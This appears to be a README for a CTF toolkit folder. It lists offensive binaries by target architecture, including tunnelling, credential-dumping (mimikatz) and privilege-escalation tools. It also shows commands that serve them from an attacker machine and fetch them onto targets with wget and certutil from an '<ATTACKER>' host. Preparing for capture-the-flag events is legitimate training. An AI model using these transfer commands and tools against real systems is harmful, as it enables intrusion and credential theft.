# bins/ — Pre-compiled Binaries for Target Upload

Static binaries for each architecture. Download and populate before the CTF.

## Directory Structure

```
bins/
├── linux-amd64/      # Most Linux targets (x86_64)
│   ├── chisel
│   ├── ligolo-agent
│   ├── socat
│   ├── kerbrute
│   ├── pspy64
│   └── linpeas.sh
├── linux-arm64/      # ARM Linux (Raspberry Pi, some IoT)
│   ├── chisel
│   ├── ligolo-agent
│   └── socat
├── windows-amd64/    # Windows targets
│   ├── chisel.exe
│   ├── ligolo-agent.exe
│   ├── kerbrute.exe
│   ├── SharpHound.exe
│   ├── Rubeus.exe
│   ├── Certify.exe
│   ├── Inveigh.exe
│   ├── Snaffler.exe
│   ├── winPEASx64.exe
│   ├── PrintSpoofer64.exe
│   ├── GodPotato.exe
│   └── mimikatz/
│       ├── mimikatz.exe
│       └── mimilib.dll
└── darwin-arm64/     # Attacker PC (Apple Silicon Mac)
    ├── chisel
    └── ligolo-proxy
```

## How to Check Target Architecture

```bash
# Linux
uname -m          # x86_64 → linux-amd64, aarch64 → linux-arm64
file /bin/ls      # ELF 64-bit LSB ... x86-64 or ARM aarch64

# Windows
echo %PROCESSOR_ARCHITECTURE%   # AMD64
```

## Upload Methods

```bash
# HTTP server on attacker PC
cd tools/bins/linux-amd64 && python3 -m http.server 8888

# Or SMB server (for Windows targets)
smbserver.py share tools/bins/windows-amd64

# Download on target
wget http://<ATTACKER>:8888/chisel        # Linux
certutil -urlcache -f http://<ATTACKER>:8888/chisel.exe chisel.exe  # Windows
```
